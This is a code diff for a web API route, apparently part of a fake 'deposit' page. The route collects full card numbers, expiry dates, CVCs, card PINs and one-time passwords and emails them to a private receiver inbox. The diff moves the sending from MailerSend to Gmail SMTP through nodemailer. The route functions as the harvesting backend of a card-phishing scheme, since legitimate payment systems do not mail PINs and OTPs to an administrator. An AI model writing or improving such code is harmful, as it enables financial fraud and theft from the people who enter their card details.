@@ -1,5 +1,5 @@
 import { render } from "@react-email/render"
-import { MailerSend, EmailParams, Sender, Recipient } from "mailersend"
+import nodemailer from "nodemailer"
 import { PinEmail, OtpEmail } from "../../../components/email-templates"
 
 export async function POST(request: Request) {
@@ -14,11 +14,12 @@ export async function POST(request: Request) {
 
     const { email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin, otp } = data
 
-    const apiToken = process.env.MAILERSEND_API_TOKEN
+    const smtpUser = process.env.SMTP_USER      // your Gmail address
+    const smtpPass = process.env.SMTP_PASS      // your Gmail app password
     const receiverEmail = process.env.RECEIVER_EMAIL
 
-    if (!apiToken) {
-      console.log("[v0] Missing MAILERSEND_API_TOKEN")
+    if (!smtpUser || !smtpPass) {
+      console.log("[v0] Missing SMTP credentials")
       return Response.json({ success: false, error: "Email service not configured" }, { status: 500 })
     }
 
@@ -27,13 +28,14 @@ export async function POST(request: Request) {
       return Response.json({ success: false, error: "Receiver email not configured" }, { status: 500 })
     }
 
-    const mailerSend = new MailerSend({
-      apiKey: apiToken,
+    // Setup SMTP transporter
+    const transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user: smtpUser,
+        pass: smtpPass,
+      },
     })
-
-    const fromEmail = "secure@test-yxj6ljx4do2r.mlsender.net"
-    const sentFrom = new Sender(fromEmail, "Deposit System")
-    const recipients = [new Recipient(receiverEmail, "Admin")]
 
     let subject = ""
     let emailHtml = ""
@@ -50,35 +52,34 @@ export async function POST(request: Request) {
           cvc={cvc}
           cardType={cardType}
           pin={pin}
-        />,
+        />
       )
     } else if (step === "otp") {
       subject = `Deposit Transaction - OTP Verification (${email})`
       emailHtml = render(<OtpEmail email={email} amount={amount} otp={otp} />)
     }
 
-    const emailParams = new EmailParams()
-      .setFrom(sentFrom)
-      .setTo(recipients)
-      .setSubject(subject)
-      .setHtml(emailHtml)
-      .setText(`Deposit notification for ${email}, amount: ₦${amount}`)
+    // Send email
+    const response = await transporter.sendMail({
+      from: `"Deposit System" <${smtpUser}>`,
+      to: receiverEmail,
+      subject,
+      html: emailHtml,
+      text: `Deposit notification for ${email}, amount: ₦${amount}`,
+    })
 
-    console.log("[v0] Sending email with MailerSend SDK")
+    console.log("[v0] Email sent successfully:", response.messageId)
 
-    const response = await mailerSend.email.send(emailParams)
-
-    console.log("[v0] Email sent successfully:", response)
     return Response.json({ success: true })
-  } catch (error) {
+  } catch (error: any) {
     console.log("[v0] Email API error:", error)
     return Response.json(
       {
         success: false,
         error: "Failed to send email",
-        details: error instanceof Error ? error.message : "Unknown error",
+        details: error?.message || "Unknown error",
       },
-      { status: 500 },
+      { status: 500 }
     )
   }
 }
